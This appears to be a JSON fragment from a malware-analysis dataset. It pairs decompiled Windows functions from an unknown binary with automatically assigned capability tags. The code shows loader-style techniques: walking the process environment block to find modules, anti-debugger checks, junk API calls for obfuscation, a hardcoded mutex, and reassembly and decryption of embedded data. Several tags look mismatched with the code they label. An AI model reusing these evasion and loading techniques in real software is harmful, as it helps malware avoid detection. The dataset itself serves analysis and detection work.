        "decompiled_code": "\nvoid fcn.00402339(void)\n\n{\n    uint var_98h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint *var_84h;\n    uint *var_80h;\n    int32_t var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ah;\n    uint var_24h;\n    uint var_10h;\n    \n    var_80h = &var_24h;\n    var_10h = 0x3df05daf;\n    fcn.00401de2(var_80h, 0x403405, 0xb);\n    var_7ch = 0;\n    var_84h = &var_6ah;\n    do {\n        if (*var_80h == '\\0') {\n            *var_84h = 0;\n            break;\n        }\n        *var_84h = *var_80h;\n        var_7ch = var_7ch + 1;\n        var_80h = var_80h + 1;\n        var_84h = var_84h + 2;\n    } while (var_7ch != 0x14);\n    fcn.00402572(&var_6ah, 0);\n    return;\n}\n",
        "token_count": 296
    },
    "00402429": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402429(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t arg_8h_00;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    arg_8h_00 = fcn.004011eb(0x40, *0x415dac + -0x124);\n    var_1ch = 0;\n    if (arg_8h_00 != 0) {\n        fcn.004016e7(arg_8h_00, arg_ch);\n        *(arg_8h + 0x54) = arg_8h_00;\n        *(arg_8h + 0x58) = arg_8h_00 + -0x400000;\n        var_1ch = arg_8h_00 + 0x2b20;\n    }\n    return var_1ch;\n}\n",
        "token_count": 226
    },
    "004024ce": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool fcn.004024ce(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    bool bVar3;\n    int32_t iVar4;\n    int32_t in_FS_OFFSET;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    iVar2 = fcn.00402339();\n    iVar4 = 0;\n    if (*(iVar2 + 1 + *(iVar2 + 0x3c)) == 'E') {\n        iVar4 = iVar2 + *(iVar2 + 0x3c);\n    }\n    iVar2 = *(in_FS_OFFSET + 0x18);\n    if (iVar2 == 0) {\n        iVar2 = -1;\n    }\n    uVar1 = *(*(iVar2 + 0x30) + 0xa4);\n    bVar3 = true;\n    if (uVar1 != 5) {\n        bVar3 = 0x549352b9 < *(iVar4 + 8) && uVar1 < 6;\n    }\n    return bVar3;\n}\n",
        "token_count": 244
    },
    "00402572": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Removing unreachable block (ram,0x00402746)\n// WARNING: Removing unreachable block (ram,0x00402756)\n\nint32_t * __cdecl fcn.00402572(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int16_t iVar3;\n    int16_t iVar4;\n    int32_t in_FS_OFFSET;\n    bool bVar5;\n    uint32_t uStack72;\n    int32_t *piStack28;\n    uint var_ch;\n    \n    iVar1 = *(in_FS_OFFSET + 0x18);\n    if (iVar1 == 0) {\n        iVar1 = -1;\n    }\n    iVar1 = *(*(iVar1 + 0x30) + 0xc);\n    piVar2 = iVar1 + 0x14;\n    piStack28 = *(iVar1 + 0x14);\n    if (piStack28 != piVar2) {\n        do {\n            if (arg_ch != NULL && piStack28[4] == arg_ch) {\n                return piStack28 + -2;\n            }\n            if (arg_8h != 0) {\n                uStack72 = 0;\n                if (*(piStack28 + 9) >> 1 != 0) {\n                    do {\n                        iVar3 = *(piStack28[10] + uStack72 * 2);\n                        if (iVar3 - 0x61U < 0x1a) {\n                            iVar3 = iVar3 + -0x20;\n                        }\n                        iVar4 = *(arg_8h + uStack72 * 2);\n                        if (iVar4 - 0x61U < 0x1a) {\n                            iVar4 = iVar4 + -0x20;\n                        }\n                        if (iVar3 == 0) {\n                            bVar5 = iVar4 == 0;\n                            break;\n                        }\n                        uStack72 = uStack72 + 1;\n                        bVar5 = iVar3 == iVar4;\n                    } while (bVar5 && uStack72 < *(piStack28 + 9) >> 1);\n                    if (bVar5) {\n                        return piStack28[4];\n                    }\n                }\n            }\n            piStack28 = *piStack28;\n        } while (piStack28 != piVar2);\n    }\n    return NULL;\n}\n",
        "token_count": 531
    },
    "00402818": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nuint32_t fcn.00402818(void)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t in_FS_OFFSET;\n    uint32_t uStack44;\n    uint uStack36;\n    uint32_t uStack32;\n    ushort uStack26;\n    uint uStack24;\n    uint uStack20;\n    uint var_8h;\n    \n    uStack20 = 0;\n    uStack24 = 0x38140cd1;\n    uStack26 = 0x12b4;\n    uStack32 = 0x40d22916;\n    uStack36 = 0;\n    iVar1 = fcn.00402339();\n    uStack44 = uStack32 ^ 0x40d22916;\n    if (iVar1 != 0) {\n        iVar1 = fcn.00402572(0, iVar1);\n        pcVar2 = fcn.004020d8();\n        uStack44 = 0;\n        if (pcVar2 != NULL) {\n            uStack44 = 0x40d22916 - uStack32;\n            if (**(iVar1 + 0x28) != 0) {\n                (*pcVar2)(*(iVar1 + 0x28), &uStack36);\n                iVar1 = *(in_FS_OFFSET + 0x18);\n                if (iVar1 == 0) {\n                    iVar1 = -1;\n                }\n                uStack44 = *(iVar1 + 0x34) != 0xc1;\n            }\n        }\n    }\n    return uStack44;\n}\n",
        "token_count": 358
    },
    "00402991": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00402991(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_1ch;\n    int32_t var_18h;\n    int16_t var_12h;\n    uint var_10h;\n    \n    var_10h = 0x5b6ee34c;\n    var_12h = 0x288d;\n    var_44h = 0;\n    var_5ch = 0;\n    if (arg_ch != 0) {\n        fcn.00401de2(&var_40h, 0x40341e, 0x18);\n        var_18h = 0;\n        var_1ch._2_2_ = var_12h + -0x288d;\n        var_1ch._0_2_ = 0;\n        pcVar2 = fcn.00401ab4(&var_40h);\n        var_5ch = 0;\n        if (pcVar2 != NULL) {\n            var_18h = arg_ch;\n            var_78h = 0;\n            iVar1 = var_78h;\n            do {\n                var_78h = iVar1;\n                iVar1 = var_78h + 1;\n            } while (*(arg_ch + var_78h) != '\\0');\n            var_1ch._0_2_ = var_78h;\n            var_1ch._2_2_ = var_1ch;\n            (*pcVar2)(arg_8h, &var_1ch, 0, &var_44h);\n            var_5ch = var_44h;\n        }\n    }\n    return var_5ch;\n}\n",
        "token_count": 499
    },
    "00402d2a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint16_t * __cdecl fcn.00402d2a(int32_t arg_8h)\n\n{\n    uint var_1ch;\n    uint var_18h;\n    int16_t *var_14h;\n    uint var_10h;\n    code *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = fcn.00401ff8;\n    if (arg_8h == 0) {\n        for (; ((*var_ch != 0x5a4d || (*(var_ch + *(var_ch + 0x3c)) != 'P')) ||\n               (var_14h = var_ch,  *(var_ch + *(var_ch + 0x3c) + 1) != 'E')); var_ch = var_ch + -0x1000 & 0xfffff000) {\n        }\n    }\n    else {\n        var_14h = fcn.00402572(arg_8h, 0);\n    }\n    return var_14h;\n}\n",
        "token_count": 223
    },
    "00402059": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00402059(uint noname_0, uint arg_ch)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    uint in_stack_ffffffdc;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.004024ce();\n    bVar2 = true;\n    if (iVar1 == 0) {\n        iVar1 = fcn.00402c9c(in_stack_ffffffdc, arg_ch);\n        bVar2 = true;\n        if (iVar1 == 0) {\n            iVar1 = fcn.00402818();\n            bVar2 = iVar1 != 0;\n        }\n    }\n    return bVar2;\n}\n",
        "token_count": 182
    },
    "00402c9c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nbool __cdecl fcn.00402c9c(uint noname_0, char *arg_ch)\n\n{\n    char cVar1;\n    uint var_18h;\n    uint var_11h;\n    uint var_8h;\n    uint var_1h;\n    \n    cVar1 = *arg_ch;\n    while( true ) {\n        if (cVar1 != -1) {\n            var_11h._0_1_ = false;\n            if ((cVar1 == -0x48) && (var_11h._0_1_ = false,  arg_ch[3] == 'P')) {\n                var_11h._0_1_ = arg_ch[4] == -0x33;\n            }\n            return var_11h._0_1_;\n        }\n        if (arg_ch[1] != '%') break;\n        arg_ch = **(arg_ch + 2);\n        cVar1 = *arg_ch;\n    }\n    return false;\n}\n",
        "token_count": 239
    },
    "00401522": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nvoid fcn.00401522(void)\n\n{\n    int32_t iVar1;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    int32_t var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    \n    var_ch = 0x151338a8;\n    (*_sym.imp.KERNEL32.dll_GetConsoleCP)();\n    var_cch = 0;\n    do {\n        (*_sym.imp.KERNEL32.dll_GetTimeZoneInformation)(&var_bch);\n        (*_sym.imp.KERNEL32.dll_GetProcessId)(0xdb9fe3);\n        var_10h = var_ch ^ 0x151330a4;\n        iVar1 = var_ch + 0xeaeccac8;\n        var_cch = var_cch + 1;\n        (*_sym.imp.KERNEL32.dll_GetProcessHandleCount)(0xbac021, &var_10h);\n        (*_sym.imp.USER32.dll_GetMenuState)(0x7cde82, iVar1, 0x7f9);\n    } while (var_cch != 6);\n    return;\n}\n",
        "token_count": 304
    },
    "00402b18": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402b18(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t arg_8h_00;\n    uint32_t uVar4;\n    uint32_t var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    \n    var_14h = 0;\n    var_18h = 0;\n    do {\n        var_18h = (*(var_14h * 0x88 + 0x415a5c) ^ *(var_14h * 0x88 + 0x415a58)) + var_18h;\n        var_14h = var_14h + 1;\n    } while (var_14h != 7);\n    arg_8h_00 = fcn.004011eb(4, var_18h);\n    var_28h = 0;\n    var_2ch = 0;\n    do {\n        uVar1 = *(var_2ch * 0x88 + 0x415a58);\n        iVar2 = *(var_2ch * 0x88 + 0x4159ec);\n        uVar3 = *(var_2ch * 0x88 + 0x415a5c);\n        uVar4 = uVar1 ^ uVar3;\n        var_48h = 0;\n        if (uVar3 != uVar1) {\n            do {\n                *(arg_8h_00 + var_28h + var_48h) = *(iVar2 + var_48h);\n                var_48h = var_48h + 1;\n            } while (var_48h != uVar4);\n        }\n        var_2ch = var_2ch + 1;\n        var_28h = uVar4 + var_28h;\n    } while (var_2ch != 7);\n    fcn.00401f11(arg_8h_00, arg_8h_00, var_18h);\n    fcn.004012cf(arg_8h, arg_8h_00);\n    *(arg_8h + 0xc) = *0x415db8;\n    *(arg_8h + 4) = *0x415db4;\n    return 0;\n}\n",
        "token_count": 612
    },
    "0040119b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040119b(void)\n\n{\n    uint arg_8h;\n    uint var_28h;\n    uint var_24h;\n    uint var_4h;\n    \n    var_4h = 0xdeacfaa;\n    fcn.00401de2(&var_24h, 0x403436, 0xe);\n    arg_8h = fcn.00402210();\n    *0x415da8 = fcn.00402991(arg_8h, &var_24h);\n    return;\n}\n",
        "token_count": 120
    },
    "004012cf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004012cf(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    arg_8h[2] = arg_ch + *0x415dbc;\n    *arg_8h = arg_ch + *0x415dc0;\n    return;\n}\n",
        "token_count": 65
    },
    "004012ed": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004012ed(void)\n\n{\n    uint arg_8h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    \n    fcn.00401de2(&var_20h, 0x4034c3, 0x10);\n    arg_8h = fcn.00402210();\n    fcn.00402991(arg_8h, &var_20h);\n    return;\n}\n",
        "token_count": 102
    },
    "00401334": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401334(void)\n\n{\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    var_ch = 0x89b;\n    var_10h = 0xa4f;\n    (*_sym.imp.USER32.dll_SetSysColors)(0x948, &var_ch, &var_10h);\n    (*_sym.imp.GDI32.dll_SetWindowOrgEx)(0xfddc79, 0xa97, 0x1d7, &var_8h);\n    (*_sym.imp.KERNEL32.dll_SetProcessWorkingSetSize)(0x193768, 0x1623d0, 0x1623d0);\n    return;\n}\n",
        "token_count": 178
    },
    "0040139d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create mutex"
        ],
        "decompiled_code": "\nvoid fcn.0040139d(void)\n\n{\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint32_t var_8h;\n    \n    var_8h = 0x540f42c7;\n    (*_sym.imp.KERNEL32.dll_CreateMutexExA)(0, \"28723_92346_2394_FFFA\", 0, 0);\n    (*_sym.imp.KERNEL32.dll_GetUserDefaultLocaleName)(L\"FW/5AZyH9g\", 0x28);\n    (*_sym.imp.ADVAPI32.dll_AddUsersToEncryptedFile)(L\"?EzIHULklZ\", &var_10h);\n    (*_sym.imp.USER32.dll_HiliteMenuItem)(0x77ee1a, 0xa92978, 0x7a3, var_8h + 0xabf0c152);\n    (*_sym.imp.KERNEL32.dll_SetCommBreak)(0x84eb1d);\n    (*_sym.imp.GDI32.dll_FrameRgn)(0xb8ef52, 0xca19c4, 0x63c333, var_8h + 0xabf0c4fa, var_8h + 0xabf0c4fa);\n    (*_sym.imp.GDI32.dll_SetPolyFillMode)(0xfd1caf, 0xdf3);\n    (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n    (*_sym.imp.KERNEL32.dll_DeactivateActCtx)(0x540f4fa6 - var_8h, 0x541a15b9 - var_8h);\n    (*_sym.imp.USER32.dll_CopyImage)(0x5680da, 0x326, var_8h ^ 0x540f479d, var_8h ^ 0x540f479d, 0x7bb);\n    return;\n}\n",
        "token_count": 475
    },
    "004020d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004020d8(void)\n\n{\n    uint arg_8h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    \n    fcn.00401de2(&var_20h, 0x4034b3, 0x10);\n    arg_8h = fcn.00402210();\n    fcn.00402991(arg_8h, &var_20h);\n    return;\n}\n",
        "token_count": 103
    },
    "00402139": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00402139(void)\n\n{\n    int32_t iVar1;\n    int32_t in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *(in_FS_OFFSET + 0x18);\n    var_ch = -1;\n    if ((iVar1 != 0) && (var_ch = iVar1,  iVar1 == 1)) {\n        var_ch = 0;\n    }\n    return var_ch;\n}\n",
        "token_count": 118
    },
    "004021a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004021a4(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00402210();\n    fcn.00402991(arg_8h_00, arg_8h);\n    return;\n}\n",
        "token_count": 73
    },
    "00402307": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402307(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_4h;\n    \n    iVar2 = arg_8h + *(arg_8h + 0x3c);\n    if (*(arg_8h + *(arg_8h + 0x3c)) == 'P') {\n        iVar1 = 0;\n        if (*(iVar2 + 1) == 'E') {\n            iVar1 = iVar2;\n        }\n        return iVar1;\n    }\n    return 0;\n}\n",
        "token_count": 132
    },
    "0040254b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nint16_t __cdecl fcn.0040254b(uint arg_8h)\n\n{\n    if (arg_8h - 0x61U < 0x1a) {\n        arg_8h._0_2_ = arg_8h + -0x20;\n    }\n    return arg_8h;\n}\n",
        "token_count": 72
    },
    "004027ce": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encode data using XOR"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_5h\n\nint32_t __cdecl fcn.004027ce(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_5h;\n    \n    var_14h = 0;\n    iVar1 = var_14h;\n    do {\n        var_14h = iVar1;\n        iVar1 = var_14h + 1;\n    } while (*(arg_8h + var_14h) != '\\0');\n    return var_14h;\n}\n",
        "token_count": 148
    },
    "00402ac3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402ac3(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_FS_OFFSET;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    \n    iVar1 = *(in_FS_OFFSET + arg_8h);\n    var_18h = -1;\n    if ((iVar1 != 0) && (var_18h = iVar1,  iVar1 == 1)) {\n        var_18h = 0;\n    }\n    return var_18h;\n}\n",
        "token_count": 142
    }
}